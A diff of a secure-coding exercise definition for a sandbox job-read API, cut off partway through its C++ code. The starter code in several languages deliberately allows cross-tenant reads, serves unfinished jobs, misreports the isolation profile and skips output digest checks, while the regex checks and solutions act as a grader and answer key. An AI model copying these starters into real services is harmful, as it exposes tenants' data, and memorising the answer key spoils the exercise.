@@ -5,491 +5,396 @@ export const readStep: Step = {
   title: 'GET /v1/sandbox/jobs/{id}: results with provenance',
   concept: 'http',
   file: 'read',
-  focus: ['client', 'api', 'store'],
+  focus: ['client', 'api', 'redis'],
   task: `## Task
 
-**Starting point.** The starter registers \`GET /v1/sandbox/jobs/{job_id}\`, loads the record with
-\`store.get(job_id)\` and answers 200 with \`exit_code\`, \`usage\`, the requested profile under
-\`profile\`, and an output object holding a download URL plus the raw bytes from
-\`store.read_output\`. It serves the demo and hides four flaws.
+**Starting point.** The starter registers \`GET /v1/sandbox/jobs/{job_id}\` on the job store: it
+loads the job with \`jobs.get\` (404 when there is none) and answers 200 with \`job_id\`, \`status\`,
+\`exit_code\`, \`usage\`, the requested profile under \`profile\`, \`output_digest\` and the stored
+output from \`jobs.read_output\`. It serves the demo and hides four flaws.
 
-**Failure mode the checks target.** The read path trusts the record. Any tenant reads any job by
-guessing an id, a queued or lease-expired job comes back as a result, a container that started
-weaker reads as isolated, and the output bytes are served without a check that they are the ones
-the job produced.
+**Failure mode the checks target.** Any caller reads any tenant's job by guessing an id; a queued or
+running job reads as a result; a job the node ran under \`kata\` when \`gvisor\` was asked for reports
+\`gvisor\`; and output that was changed after the job wrote it is served as the job's output.
 
-- The tenant comes from \`X-Tenant-Id\` (**401** when missing). An unknown id or a job owned by
-  another tenant is **404**; a 403 would confirm the id exists.
-- Only a job in \`JOB_FINISHED\` has a result; a queued, running or lease-expired job answers
-  **409**.
-- Report \`used_profile\`, the profile the runner recorded, not \`requested_profile\`.
-- Keep \`exit_code\` and \`usage\` (wall time, CPU time, peak memory, whether the limit was hit) in
-  the response.
-- \`verify_digest\` recomputes the SHA-256 of the stored output and compares it with the recorded
-  digest before publishing a URL; on mismatch answer **500** with \`DIGEST_MISMATCH\` and serve no
-  download.`,
+- The tenant is \`X-Tenant-Id\` (**401** without it). An unknown id and another tenant's job are both
+  **404**: a 403 would confirm the id exists.
+- Only a \`finished\` job has a result; a queued or running one is **409**.
+- Report \`used_profile\`, the profile the container ran under, next to \`exit_code\` and \`usage\`
+  (\`cpu_ms\`, \`mem_mb\`).
+- Recompute \`jobs.digest(output)\` and compare it with the recorded \`output_digest\` before serving
+  the output; on a mismatch answer **500** \`{"error": "DIGEST_MISMATCH"}\` and serve no output.`,
   sequence: {
     participants: ['Client', 'Sandbox API', 'job store'],
     messages: [
       {from: 'Client', to: 'Sandbox API', label: 'GET /v1/sandbox/jobs/{id} · X-Tenant-Id', kind: 'sync'},
-      {from: 'Sandbox API', to: 'job store', label: 'get(job_id)', kind: 'sync'},
-      {from: 'job store', to: 'Sandbox API', label: '{tenant, status, used_profile, digests}', kind: 'reply'},
-      {from: 'Sandbox API', to: 'Sandbox API', label: 'other tenant or unfinished → 404 / 409', kind: 'sync'},
-      {from: 'Sandbox API', to: 'job store', label: 'read_output(job_id) for the digest check', kind: 'sync'},
+      {from: 'Sandbox API', to: 'job store', label: 'get(id)', kind: 'sync'},
+      {from: 'Sandbox API', to: 'Client', label: '404 unknown or foreign · 409 not finished', kind: 'reply'},
+      {from: 'Sandbox API', to: 'job store', label: 'read_output(id)', kind: 'sync'},
+      {from: 'Sandbox API', to: 'Sandbox API', label: 'digest(output) == output_digest?', kind: 'sync'},
       {
         from: 'Sandbox API',
         to: 'Client',
-        label: '200 {exit_code, usage, used_profile, output{url, digest}}',
+        label: '200 {exit_code, usage, used_profile, output} · 500 DIGEST_MISMATCH',
         kind: 'reply',
       },
     ],
   },
-  hints: [
-    'A tenant pastes a job id from another team’s logs and gets that team’s program output; a job that is still queued returns 200 with an empty output and the requested profile.',
-    '`store.get(job_id)` carries no tenant, nothing reads the status, the response copies `requested_profile`, and the bytes come straight from `read_output` with no comparison against the recorded digest.',
-    '`if job is None or job["tenant"] != tenant: 404`; `status != JOB_FINISHED: 409`; return `used_profile`; `verify_digest(store.read_output(job_id), job["output_digest"])`, else 500 `DIGEST_MISMATCH`.',
-  ],
   checks: [
     {
-      id: 'route',
-      title: 'Handles GET /v1/sandbox/jobs/{id}',
-      detail: 'Register the read route on `GET /v1/sandbox/jobs/{job_id}`.',
-      match: {
-        python: {all: [/@app\.get\(\s*["']\/v1\/sandbox\/jobs\/\{job_id\}["']/]},
-        typescript: {all: [/app\.get\(\s*['"]\/v1\/sandbox\/jobs\/:id['"]/]},
-        go: {all: [/HandleFunc\(\s*"GET \/v1\/sandbox\/jobs\//]},
-        scala: {all: [/path\(\s*"v1"\s*\/\s*"sandbox"\s*\/\s*"jobs"\s*\/\s*Segment\s*\)/, /\bget\s*\{/]},
-        cpp: {all: [/svr\.Get\(\s*"\/v1\/sandbox\/jobs\//]},
-      },
-    },
-    {
-      id: 'used-profile',
-      title: 'Reports the isolation profile actually used',
-      detail:
-        'The response carries the runner’s `used_profile`, not the profile the submitter requested. The starter reports the requested one, so a container that started weaker reads as if it had been isolated.',
-      match: {
-        python: {all: [/used_profile/]},
-        typescript: {all: [/used_profile/]},
-        go: {all: [/UsedProfile/]},
-        scala: {all: [/used_profile/]},
-        cpp: {all: [/used_profile/]},
-      },
-    },
-    {
-      id: 'digest-verify',
-      title: 'Verifies the output digest before serving it',
-      detail:
-        'The stored output is re-hashed and compared with the recorded digest (`verify_digest`); a mismatch is a 500 with no download. The starter hands out the raw output nobody checked.',
-      match: {
-        python: {all: [/def verify_digest\(/, /DIGEST_MISMATCH/]},
-        typescript: {all: [/function verifyDigest/, /DIGEST_MISMATCH/]},
-        go: {all: [/func verifyDigest\(/, /digestMismatch/]},
-        scala: {all: [/def verifyDigest/, /DigestMismatch/]},
-        cpp: {all: [/verifyDigest\(/, /kDigestMismatch/]},
-      },
-    },
-    {
       id: 'tenant-scope',
-      title: 'A foreign or unknown job is 404',
+      title: 'Serves a job only to its tenant',
       detail:
-        'The job id is looked up **with** the tenant, and a job belonging to someone else is **404**. The starter serves any tenant’s job by id — a cross-tenant read of another team’s program output.',
+        "No `X-Tenant-Id` is **401**; another tenant's job and an unknown id are both **404**, with nothing of the job in the body. The starter serves any job to anyone.",
       match: {
-        python: {all: [/tenant/, /status_code\s*=\s*404/]},
-        typescript: {all: [/tenant/, /code\(\s*404\s*\)/]},
-        go: {all: [/tenant/, /StatusNotFound/]},
-        scala: {all: [/tenant/, /StatusCodes\.NotFound/]},
-        cpp: {all: [/tenant/, /\b404\b/]},
+        python: {
+          all: [/x-tenant-id/i, /\b401\b/, /\["tenant"\]\s*!=\s*tenant|tenant\s*!=\s*job\["tenant"\]/],
+          none: [/\b403\b/],
+        },
+        typescript: {
+          all: [/x-tenant-id/i, /\b401\b/, /\.tenant\s*!==?\s*tenant|tenant\s*!==?\s*job\.tenant/],
+          none: [/\b403\b/],
+        },
+        go: {
+          all: [/X-Tenant-Id/i, /StatusUnauthorized|\b401\b/, /\.Tenant\s*!=\s*tenant/],
+          none: [/StatusForbidden|\b403\b/],
+        },
+        scala: {all: [/X-Tenant-Id/i, /Unauthorized/, /\.tenant\s*[!=]=\s*tenant/], none: [/Forbidden/]},
+        cpp: {all: [/X-Tenant-Id/i, /\b401\b/, /(->|\.)tenant\s*!=\s*tenant/], none: [/\b403\b/]},
       },
     },
     {
       id: 'finished-only',
-      title: 'Serves a result only for a finished job',
+      title: 'Answers 409 for a job that has no result yet',
       detail:
-        'A queued, running or lease-expired job answers **409**, so the reader can tell "not done" from "done with no output". The starter returns a 200 for any record it finds.',
+        'A queued or running job is **409**; only a `finished` one answers 200 with its exit code. The starter answers 200 with a null exit code, which a client reads as a result.',
       match: {
-        python: {all: [/JOB_FINISHED/, /status_code\s*=\s*409/]},
-        typescript: {all: [/JOB_FINISHED/, /code\(\s*409\s*\)/]},
-        go: {all: [/jobFinished/, /StatusConflict/]},
-        scala: {all: [/JobFinished/, /StatusCodes\.Conflict/]},
-        cpp: {all: [/kJobFinished/, /\b409\b/]},
+        python: {all: [/["']finished["']/, /\b409\b/]},
+        typescript: {all: [/['"]finished['"]/, /\b409\b/]},
+        go: {all: [/"finished"/, /StatusConflict|\b409\b/]},
+        scala: {all: [/"finished"/, /Conflict/]},
+        cpp: {all: [/"finished"/, /\b409\b/]},
+      },
+    },
+    {
+      id: 'used-profile',
+      title: 'Reports the profile the job ran under',
+      detail:
+        'The answer carries `used_profile` (kata for a gvisor request the node ran under kata), `exit_code` and `usage`; it does not present the requested profile as the one used. The starter reports the requested profile.',
+      match: {
+        python: {
+          all: [/["']used_profile["']\s*:\s*job\[["']used_profile["']\]/],
+          none: [/["']profile["']\s*:\s*job\[["']profile["']\]/],
+        },
+        typescript: {all: [/used_profile:\s*job\.used_profile/], none: [/\bprofile:\s*job\.profile/]},
+        go: {all: [/"used_profile":\s*job\.UsedProfile/], none: [/"profile":\s*job\.Profile/]},
+        scala: {all: [/"used_profile"\s*->/], none: [/"profile"\s*->\s*JsString\(job\.profile\)/]},
+        cpp: {all: [/\{"used_profile",\s*job->used_profile\}/], none: [/\{"profile",\s*job->profile\}/]},
+      },
+    },
+    {
+      id: 'digest-verify',
+      title: 'Verifies the output against its digest before serving it',
+      detail:
+        'The stored output is hashed and compared with `output_digest`; output changed after the job wrote it answers **500** `DIGEST_MISMATCH` and none of it. The starter serves whatever bytes the store holds.',
+      match: {
+        python: {all: [/jobs\.digest\(/, /DIGEST_MISMATCH/, /\b500\b/]},
+        typescript: {all: [/\bdigest\(/, /DIGEST_MISMATCH/, /\b500\b/]},
+        go: {all: [/jobs\.Digest\(/, /DIGEST_MISMATCH/, /StatusInternalServerError|\b500\b/]},
+        scala: {all: [/Jobs\.digest\(/, /DIGEST_MISMATCH/, /InternalServerError/]},
+        cpp: {all: [/jobs::digest\(/, /DIGEST_MISMATCH/, /\b500\b/]},
       },
     },
   ],
   code: {
     python: {
-      starter: `from fastapi import FastAPI
+      starter: `from fastapi import FastAPI, Request
 from fastapi.responses import JSONResponse
 
-app = FastAPI()
-
-
-class JobStore:
-    def get(self, job_id: str) -> dict | None:
-        """The job record, whoever it belongs to."""
-        raise NotImplementedError
-
-    def read_output(self, job_id: str) -> bytes:
-        """The stored output bytes of the job."""
-        raise NotImplementedError
-
-
-store = JobStore()
-
-
-@app.get("/v1/sandbox/jobs/{job_id}")
-def read_job(job_id: str) -> JSONResponse:
-    # TODO: this starter has 4 flaws. The task says where to look; the checks say what must change.
-    job = store.get(job_id)
-    return JSONResponse(
-        {
-            "job_id": job_id,
-            "exit_code": job["exit_code"],
-            "usage": job["usage"],
-            "profile": job["requested_profile"],
-            "output": {"url": f"/v1/sandbox/jobs/{job_id}/output", "body": store.read_output(job_id)},
-        },
-        status_code=200,
-    )
-`,
-      solution: `import hashlib
-
-from fastapi import FastAPI, Header, HTTPException
+from sandbox import jobs  # get, read_output, digest
 
 app = FastAPI()
 
-JOB_FINISHED = "finished"
-DIGEST_MISMATCH = "output digest does not match the stored result"
-
-
-class JobStore:
-    def get(self, job_id: str) -> dict | None:
-        """The job record, whoever it belongs to."""
-        raise NotImplementedError
-
-    def read_output(self, job_id: str) -> bytes:
-        """The stored output bytes of the job."""
-        raise NotImplementedError
-
-
-store = JobStore()
-
-
-def verify_digest(body: bytes, digest: str) -> bool:
-    """Whether the stored bytes are the ones the job produced: the only provenance the reader has."""
-    return hashlib.sha256(body).hexdigest() == digest
-
 
 @app.get("/v1/sandbox/jobs/{job_id}")
-def read_job(
-    job_id: str,
-    tenant: str | None = Header(default=None, alias="X-Tenant-Id"),
-) -> dict:
-    if tenant is None or tenant == "":
-        raise HTTPException(status_code=401, detail="missing X-Tenant-Id")
-    job = store.get(job_id)
-    if job is None or job["tenant"] != tenant:
-        raise HTTPException(status_code=404, detail="job not found")
-    if job["status"] != JOB_FINISHED:
-        raise HTTPException(status_code=409, detail=f"job is {job['status']}")
-
-    output = None
-    if job["output_digest"] is not None:
-        body = store.read_output(job_id)
-        if not verify_digest(body, job["output_digest"]):
-            raise HTTPException(status_code=500, detail=DIGEST_MISMATCH)
-        output = {
-            "url": f"/v1/sandbox/jobs/{job_id}/output",
-            "digest": job["output_digest"],
-            "verified": True,
-        }
-    return {
+def read_job(job_id: str, request: Request) -> JSONResponse:
+    # TODO: this starter has four flaws. The task says where to look; the checks say what must change.
+    job = jobs.get(job_id)
+    if job is None:
+        return JSONResponse({"error": "no such job"}, status_code=404)
+    return JSONResponse({
         "job_id": job_id,
         "status": job["status"],
         "exit_code": job["exit_code"],
-        "usage": job["usage"],
+        "usage": {"cpu_ms": job["cpu_ms"], "mem_mb": job["mem_mb"]},
+        "profile": job["profile"],
+        "output_digest": job["output_digest"],
+        "output": jobs.read_output(job_id),
+    })
+`,
+      solution: `from fastapi import FastAPI, Request
+from fastapi.responses import JSONResponse
+
+from sandbox import jobs  # get, read_output, digest
+
+app = FastAPI()
+
+
+@app.get("/v1/sandbox/jobs/{job_id}")
+def read_job(job_id: str, request: Request) -> JSONResponse:
+    tenant = request.headers.get("x-tenant-id", "")
+    if not tenant:
+        return JSONResponse({"error": "X-Tenant-Id is required"}, status_code=401)
+    job = jobs.get(job_id)
+    if job is None or job["tenant"] != tenant:
+        return JSONResponse({"error": "no such job"}, status_code=404)  # a 403 would confirm the id exists
+    if job["status"] != "finished":
+        return JSONResponse({"error": "the job has no result yet", "status": job["status"]}, status_code=409)
+    output = jobs.read_output(job_id)
+    if output is None or jobs.digest(output) != job["output_digest"]:
+        # The bytes are not the ones the job produced: serve none of them.
+        return JSONResponse({"error": "DIGEST_MISMATCH"}, status_code=500)
+    return JSONResponse({
+        "job_id": job_id,
+        "status": job["status"],
+        "exit_code": job["exit_code"],
+        "usage": {"cpu_ms": job["cpu_ms"], "mem_mb": job["mem_mb"]},
         "used_profile": job["used_profile"],
+        "output_digest": job["output_digest"],
         "output": output,
-    }
+    })
 `,
     },
     typescript: {
-      starter: `/** GET /v1/sandbox/jobs/:id: returns the stored result of a job. */
-import Fastify from 'fastify';
+      starter: `import Fastify from 'fastify';
 
-import {store} from './job_store';
-
-export const app = Fastify();
-
-app.get('/v1/sandbox/jobs/:id', async (request, reply) => {
-  // TODO: this starter has 4 flaws. The task says where to look; the checks say what must change.
-  const {id} = request.params as {id: string};
-  const job = await store.get(id);
-  return reply.code(200).send({
-    job_id: id,
-    exit_code: job.exitCode,
-    usage: job.usage,
-    profile: job.requestedProfile,
-    output: {url: \`/v1/sandbox/jobs/\${id}/output\`, body: await store.readOutput(id)},
-  });
-});
-
-void app.listen({port: 8443, host: '0.0.0.0'});
-`,
-      solution: `/** GET /v1/sandbox/jobs/:id: the result with provenance — used profile and a verified digest. */
-import {createHash} from 'node:crypto';
-import Fastify from 'fastify';
-
-import {store} from './job_store';
+import {digest, get, readOutput} from 'sandbox/jobs';
 
 export const app = Fastify();
 
-const JOB_FINISHED = 'finished';
-const DIGEST_MISMATCH = 'output digest does not match the stored result';
-
-/** Whether the stored bytes are the ones the job produced: the only provenance the reader has. */
-function verifyDigest(body: Buffer, digest: string): boolean {
-  return createHash('sha256').update(body).digest('hex') === digest;
-}
-
-app.get('/v1/sandbox/jobs/:id', async (request, reply) => {
-  const tenant = request.headers['x-tenant-id'];
-  if (typeof tenant !== 'string' || tenant === '')
-    return reply.code(401).send({error: 'missing X-Tenant-Id'});
-  const {id} = request.params as {id: string};
-  const job = await store.get(id);
-  if (job === null || job.tenant !== tenant) return reply.code(404).send({error: 'job not found'});
-  if (job.status !== JOB_FINISHED) return reply.code(409).send({error: \`job is \${job.status}\`});
-
-  let output = null;
-  if (job.outputDigest !== null) {
-    const body = await store.readOutput(id);
-    if (!verifyDigest(body, job.outputDigest)) return reply.code(500).send({error: DIGEST_MISMATCH});
-    output = {url: \`/v1/sandbox/jobs/\${id}/output\`, digest: job.outputDigest, verified: true};
-  }
-  return reply.code(200).send({
-    job_id: id,
+app.get('/v1/sandbox/jobs/:jobId', async (request, reply) => {
+  // TODO: this starter has four flaws. The task says where to look; the checks say what must change.
+  const {jobId} = request.params as {jobId: string};
+  const job = await get(jobId);
+  if (job === null) return reply.code(404).send({error: 'no such job'});
+  return {
+    job_id: jobId,
     status: job.status,
-    exit_code: job.exitCode,
-    usage: job.usage,
-    used_profile: job.usedProfile,
-    output,
-  });
+    exit_code: job.exit_code,
+    usage: {cpu_ms: job.cpu_ms, mem_mb: job.mem_mb},
+    profile: job.profile,
+    output_digest: job.output_digest,
+    output: await readOutput(jobId),
+  };
 });
+`,
+      solution: `import Fastify from 'fastify';
 
-void app.listen({port: 8443, host: '0.0.0.0'});
+import {digest, get, readOutput} from 'sandbox/jobs';
+
+export const app = Fastify();
+
+app.get('/v1/sandbox/jobs/:jobId', async (request, reply) => {
+  const tenant = request.headers['x-tenant-id'];
+  if (typeof tenant !== 'string' || tenant === '') return reply.code(401).send({error: 'X-Tenant-Id is required'});
+  const {jobId} = request.params as {jobId: string};
+  const job = await get(jobId);
+  // A 403 would confirm the id exists.
+  if (job === null || job.tenant !== tenant) return reply.code(404).send({error: 'no such job'});
+  if (job.status !== 'finished') return reply.code(409).send({error: 'the job has no result yet', status: job.status});
+  const output = await readOutput(jobId);
+  // The bytes are not the ones the job produced: serve none of them.
+  if (output === null || digest(output) !== job.output_digest) return reply.code(500).send({error: 'DIGEST_MISMATCH'});
+  return {
+    job_id: jobId,
+    status: job.status,
+    exit_code: job.exit_code,
+    usage: {cpu_ms: job.cpu_ms, mem_mb: job.mem_mb},
+    used_profile: job.used_profile,
+    output_digest: job.output_digest,
+    output,
+  };
+});
 `,
     },
     go: {
       starter: `package main
 
 import (
-	"context"
+	"encoding/json"
 	"net/http"
+
+	"sandbox/jobs" // jobs.Get, ReadOutput, Digest
 )
 
-type JobRecord struct {
-	JobID            string         \`json:"job_id"\`
-	Tenant           string         \`json:"tenant"\`
-	Status           string         \`json:"status"\`
-	ExitCode         int            \`json:"exit_code"\`
-	Usage            map[string]int \`json:"usage"\`
-	RequestedProfile string         \`json:"requested_profile"\`
-	OutputDigest     string         \`json:"output_digest"\`
+func writeJSON(rw http.ResponseWriter, status int, v any) {
+	rw.Header().Set("Content-Type", "application/json")
+	rw.WriteHeader(status)
+	json.NewEncoder(rw).Encode(v)
 }
 
-type JobStore struct{}
-
-func (s *JobStore) Get(ctx context.Context, jobID string) (*JobRecord, error) { return nil, nil }
-
-func (s *JobStore) ReadOutput(ctx context.Context, jobID string) ([]byte, error) { return nil, nil }
-
-var store = &JobStore{}
-
 func readJob(rw http.ResponseWriter, r *http.Request) {
-	// TODO: this starter has 4 flaws. The task says where to look; the checks say what must change.
+	// TODO: this starter has four flaws. The task says where to look; the checks say what must change.
 	jobID := r.PathValue("id")
-	job, _ := store.Get(r.Context(), jobID)
-	body, _ := store.ReadOutput(r.Context(), jobID)
+	job := jobs.Get(r.Context(), jobID)
+	if job == nil {
+		writeJSON(rw, http.StatusNotFound, map[string]string{"error": "no such job"})
+		return
+	}
+	output, _ := jobs.ReadOutput(r.Context(), jobID)
 	writeJSON(rw, http.StatusOK, map[string]any{
-		"job_id":    jobID,
-		"exit_code": job.ExitCode,
-		"usage":     job.Usage,
-		"profile":   job.RequestedProfile,
-		"output":    string(body),
+		"job_id":        jobID,
+		"status":        job.Status,
+		"exit_code":     job.ExitCode,
+		"usage":         map[string]int{"cpu_ms": job.CPUMs, "mem_mb": job.MemMB},
+		"profile":       job.Profile,
+		"output_digest": job.OutputDigest,
+		"output":        output,
 	})
 }
 
-func main() {
-	mux := http.NewServeMux()
+func register(mux *http.ServeMux) {
 	mux.HandleFunc("GET /v1/sandbox/jobs/{id}", readJob)
 }
 `,
       solution: `package main
 
 import (
-	"context"
-	"crypto/sha256"
-	"encoding/hex"
-	"log"
+	"encoding/json"
 	"net/http"
+
+	"sandbox/jobs" // jobs.Get, ReadOutput, Digest
 )
 
-const (
-	jobFinished    = "finished"
-	digestMismatch = "output digest does not match the stored result"
-)
-
-type JobRecord struct {
-	JobID        string         \`json:"job_id"\`
-	Tenant       string         \`json:"tenant"\`
-	Status       string         \`json:"status"\`
-	ExitCode     int            \`json:"exit_code"\`
-	Usage        map[string]int \`json:"usage"\`
-	UsedProfile  string         \`json:"used_profile"\`
-	OutputDigest string         \`json:"output_digest"\`
-}
-
-type JobStore struct{}
-
-func (s *JobStore) Get(ctx context.Context, jobID string) (*JobRecord, error) { return nil, nil }
-
-func (s *JobStore) ReadOutput(ctx context.Context, jobID string) ([]byte, error) { return nil, nil }
-
-var store = &JobStore{}
-
-// Whether the stored bytes are the ones the job produced: the only provenance the reader has.
-func verifyDigest(body []byte, digest string) bool {
-	sum := sha256.Sum256(body)
-	return hex.EncodeToString(sum[:]) == digest
+func writeJSON(rw http.ResponseWriter, status int, v any) {
+	rw.Header().Set("Content-Type", "application/json")
+	rw.WriteHeader(status)
+	json.NewEncoder(rw).Encode(v)
 }
 
 func readJob(rw http.ResponseWriter, r *http.Request) {
 	tenant := r.Header.Get("X-Tenant-Id")
 	if tenant == "" {
-		writeJSON(rw, http.StatusUnauthorized, map[string]string{"error": "missing X-Tenant-Id"})
+		writeJSON(rw, http.StatusUnauthorized, map[string]string{"error": "X-Tenant-Id is required"})
 		return
 	}
 	jobID := r.PathValue("id")
-	job, _ := store.Get(r.Context(), jobID)
+	job := jobs.Get(r.Context(), jobID)
 	if job == nil || job.Tenant != tenant {
-		writeJSON(rw, http.StatusNotFound, map[string]string{"error": "job not found"})
+		writeJSON(rw, http.StatusNotFound, map[string]string{"error": "no such job"}) // a 403 would confirm the id exists
 		return
 	}
-	if job.Status != jobFinished {
-		writeJSON(rw, http.StatusConflict, map[string]string{"error": "job is " + job.Status})
+	if job.Status != "finished" {
+		writeJSON(rw, http.StatusConflict, map[string]string{"error": "the job has no result yet", "status": job.Status})
 		return
 	}
-	var output any
-	if job.OutputDigest != "" {
-		body, _ := store.ReadOutput(r.Context(), jobID)
-		if !verifyDigest(body, job.OutputDigest) {
-			writeJSON(rw, http.StatusInternalServerError, map[string]string{"error": digestMismatch})
-			return
-		}
-		output = map[string]any{
-			"url":      "/v1/sandbox/jobs/" + jobID + "/output",
-			"digest":   job.OutputDigest,
-			"verified": true,
-		}
+	output, stored := jobs.ReadOutput(r.Context(), jobID)
+	if !stored || jobs.Digest(output) != job.OutputDigest {
+		// The bytes are not the ones the job produced: serve none of them.
+		writeJSON(rw, http.StatusInternalServerError, map[string]string{"error": "DIGEST_MISMATCH"})
+		return
 	}
 	writeJSON(rw, http.StatusOK, map[string]any{
-		"job_id":       jobID,
-		"status":       job.Status,
-		"exit_code":    job.ExitCode,
-		"usage":        job.Usage,
-		"used_profile": job.UsedProfile,
-		"output":       output,
+		"job_id":        jobID,
+		"status":        job.Status,
+		"exit_code":     job.ExitCode,
+		"usage":         map[string]int{"cpu_ms": job.CPUMs, "mem_mb": job.MemMB},
+		"used_profile":  job.UsedProfile,
+		"output_digest": job.OutputDigest,
+		"output":        output,
 	})
 }
 
-func main() {
-	mux := http.NewServeMux()
+func register(mux *http.ServeMux) {
 	mux.HandleFunc("GET /v1/sandbox/jobs/{id}", readJob)
-	log.Fatal(http.ListenAndServeTLS(":8443", "cert.pem", "key.pem", mux))
 }
 `,
     },
     scala: {
-      starter: `import org.apache.pekko.actor.ActorSystem
-import org.apache.pekko.http.scaladsl.Http
-import org.apache.pekko.http.scaladsl.model._
+      starter: `import org.apache.pekko.http.scaladsl.model.{ContentTypes, HttpEntity, HttpResponse, StatusCode, StatusCodes}
 import org.apache.pekko.http.scaladsl.server.Directives._
 import org.apache.pekko.http.scaladsl.server.Route
 import spray.json._
 
-object ReadApi {
-  implicit val system: ActorSystem = ActorSystem("sandbox")
+import sandbox.Jobs // Jobs.get, readOutput, digest
 
-  val route: Route =
-    path("v1" / "sandbox" / "jobs" / Segment) { jobId =>
-      get {
-        // TODO: this starter has 4 flaws. The task says where to look; the checks say what must change.
-        val job = store.get(jobId).get
-        complete(
-          StatusCodes.OK,
-          s"""{"job_id":"$jobId","exit_code":\${job.exitCode},"profile":"\${job.requestedProfile}","output":"\${store.readOutput(jobId)}"}"""
-        )
+object JobRead {
+  private def json(status: StatusCode, body: JsObject): HttpResponse =
+    HttpResponse(status, entity = HttpEntity(ContentTypes.\`application/json\`, body.compactPrint))
+
+  private def number(n: Option[Long]): JsValue = n.map(JsNumber(_)).getOrElse(JsNull)
+
+  val route: Route = path("v1" / "sandbox" / "jobs" / Segment) { jobId =>
+    get {
+      // TODO: this starter has four flaws. The task says where to look; the checks say what must change.
+      Jobs.get(jobId) match {
+        case None => complete(json(StatusCodes.NotFound, JsObject("error" -> JsString("no such job"))))
+        case Some(job) =>
+          complete(
+            json(
+              StatusCodes.OK,
+              JsObject(
+                "job_id" -> JsString(jobId),
+                "status" -> JsString(job.status),
+                "exit_code" -> number(job.exitCode),
+                "usage" -> JsObject("cpu_ms" -> number(job.cpuMs), "mem_mb" -> number(job.memMb)),
+                "profile" -> JsString(job.profile),
+                "output_digest" -> job.outputDigest.map(JsString(_)).getOrElse(JsNull),
+                "output" -> Jobs.readOutput(jobId).map(JsString(_)).getOrElse(JsNull),
+              ),
+            ),
+          )
       }
     }
-
-  def main(args: Array[String]): Unit = {
-    Http().newServerAt("0.0.0.0", 8443).bind(route)
   }
 }
 `,
-      solution: `import org.apache.pekko.actor.ActorSystem
-import org.apache.pekko.http.scaladsl.Http
-import org.apache.pekko.http.scaladsl.model._
+      solution: `import org.apache.pekko.http.scaladsl.model.{ContentTypes, HttpEntity, HttpResponse, StatusCode, StatusCodes}
 import org.apache.pekko.http.scaladsl.server.Directives._
 import org.apache.pekko.http.scaladsl.server.Route
 import spray.json._
 
-import java.security.MessageDigest
+import sandbox.Jobs // Jobs.get, readOutput, digest
 
-object ReadApi {
-  implicit val system: ActorSystem = ActorSystem("sandbox")
+object JobRead {
+  private def json(status: StatusCode, body: JsObject): HttpResponse =
+    HttpResponse(status, entity = HttpEntity(ContentTypes.\`application/json\`, body.compactPrint))
 
-  val JobFinished = "finished"
-  val DigestMismatch = "output digest does not match the stored result"
+  private def error(status: StatusCode, message: String): HttpResponse = json(status, JsObject("error" -> JsString(message)))
 
-  // Whether the stored bytes are the ones the job produced: the only provenance the reader has.
-  def verifyDigest(body: Array[Byte], digest: String): Boolean = {
-    MessageDigest.getInstance("SHA-256").digest(body).map("%02x".format(_)).mkString == digest
-  }
+  private def number(n: Option[Long]): JsValue = n.map(JsNumber(_)).getOrElse(JsNull)
 
-  val route: Route =
-    path("v1" / "sandbox" / "jobs" / Segment) { jobId =>
-      get {
-        optionalHeaderValueByName("X-Tenant-Id") { tenantOpt =>
-          if (!tenantOpt.exists(_.nonEmpty)) {
-            complete(StatusCodes.Unauthorized, """{"error":"missing X-Tenant-Id"}""")
-          } else {
-            store.get(jobId) match {
-              case Some(job) if job.tenant == tenantOpt.get =>
-                if (job.status != JobFinished) {
-                  complete(StatusCodes.Conflict, s"""{"error":"job is \${job.status}"}""")
-                } else {
-                  val output = job.outputDigest.map { digest =>
-                    if (!verifyDigest(store.readOutput(jobId), digest)) {
-                      throw new IllegalStateException(DigestMismatch)
-                    }
-                    s"""{"url":"/v1/sandbox/jobs/$jobId/output","digest":"$digest","verified":true}"""
-                  }
-                  complete(
-                    StatusCodes.OK,
-                    s"""{"job_id":"$jobId","exit_code":\${job.exitCode},"usage":\${job.usage.toJson.compactPrint},"used_profile":"\${job.usedProfile}","output":\${output.getOrElse("null")}}"""
-                  )
-                }
-              case _ =>
-                complete(StatusCodes.NotFound, """{"error":"job not found"}""")
-            }
-          }
+  private def read(tenant: String, jobId: String): HttpResponse =
+    Jobs.get(jobId).filter(_.tenant == tenant) match {
+      case None => error(StatusCodes.NotFound, "no such job") // a 403 would confirm the id exists
+      case Some(job) if job.status != "finished" => error(StatusCodes.Conflict, "the job has no result yet")
+      case Some(job) =>
+        Jobs.readOutput(jobId).filter(output => job.outputDigest.contains(Jobs.digest(output))) match {
+          // The bytes are not the ones the job produced: serve none of them.
+          case None => error(StatusCodes.InternalServerError, "DIGEST_MISMATCH")
+          case Some(output) =>
+            json(
+              StatusCodes.OK,
+              JsObject(
+                "job_id" -> JsString(jobId),
+                "status" -> JsString(job.status),
+                "exit_code" -> number(job.exitCode),
+                "usage" -> JsObject("cpu_ms" -> number(job.cpuMs), "mem_mb" -> number(job.memMb)),
+                "used_profile" -> job.usedProfile.map(JsString(_)).getOrElse(JsNull),
+                "output_digest" -> job.outputDigest.map(JsString(_)).getOrElse(JsNull),
+                "output" -> JsString(output),
+              ),
+            )
         }
-      }
     }
 
-  def main(args: Array[String]): Unit = {
-    Http().newServerAt("0.0.0.0", 8443).bind(route)
+  val route: Route = path("v1" / "sandbox" / "jobs" / Segment) { jobId =>
+    get {
+      optionalHeaderValueByName("X-Tenant-Id") {
+        case None | Some("") => complete(error(StatusCodes.Unauthorized, "X-Tenant-Id is required"))
+        case Some(tenant) => complete(read(tenant, jobId))
+      }
+    }
   }
 }
 `,
@@ -500,119 +405,392 @@ object ReadApi {
 
 #include <string>
 
+#include "sandbox/jobs.h"  // jobs::get, readOutput, digest
+
 using json = nlohmann::json;
 
-struct JobStore {
-  std::optional<json> get(const std::string& jobId);
-  std::string readOutput(const std::string& jobId);
-};
-
-JobStore store;
-
-int main() {
-  httplib::Server svr;
-
-  svr.Get("/v1/sandbox/jobs/([^/]+)", [](const httplib::Request& req, httplib::Response& res) {
-    // TODO: this starter has 4 flaws. The task says where to look; the checks say what must change.
-    const auto jobId = req.matches[1].str();
-    const auto job = store.get(jobId);
-    res.status = 200;
-    res.set_content(
-        json{{"job_id", jobId},
-             {"exit_code", (*job)["exit_code"]},
-             {"profile", (*job)["requested_profile"]},
-             {"output", store.readOutput(jobId)}}
-            .dump(),
-        "application/json");
-  });
-
-  svr.listen("0.0.0.0", 8443);
+void read_job(const httplib::Request& req, httplib::Response& res) {
